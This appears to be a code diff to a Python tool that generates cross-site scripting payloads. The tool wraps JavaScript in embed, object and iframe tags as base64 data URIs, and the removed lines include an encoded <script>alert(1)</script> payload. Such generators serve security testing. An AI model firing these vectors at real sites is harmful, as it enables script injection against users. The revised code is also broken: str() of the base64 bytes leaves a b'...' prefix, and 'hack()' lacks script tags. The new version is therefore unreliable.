@@ -1,3 +1,4 @@
+import base64
 import re
 from enum import Enum
 from bs4 import BeautifulSoup, Tag, ResultSet, Comment
@@ -66,7 +67,7 @@ base64Tag = ['embed', 'object', 'iframe']
 
 tag = ['a', 'img', 'html', 'script']
 
-malicious = ["alert(/1/)"]
+malicious = ["hack()"]
 
 
 def generate(text: str) -> list[str]:
@@ -130,18 +131,19 @@ def htmlType() -> list[str]:
     # base64
     for t in base64Tag:
         base64Payload = Tag(name=t)
-        payload = "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
-        if t == 'object':
-            base64Payload.attrs = {
-                "data": payload
-            }
-        elif t in ['embed', 'iframe']:
-            base64Payload.attrs = {
-                "src": payload
-            }
-        else:
-            raise Exception("error")
-        vector.append(str(base64Payload))
+        for m in malicious:
+            payload = "data:text/html;base64," + str(base64.b64encode(m.encode('utf-8')))
+            if t == 'object':
+                base64Payload.attrs = {
+                    "data": payload
+                }
+            elif t in ['embed', 'iframe']:
+                base64Payload.attrs = {
+                    "src": payload
+                }
+            else:
+                raise Exception("error")
+            vector.append(str(base64Payload))
 
     return vector
 
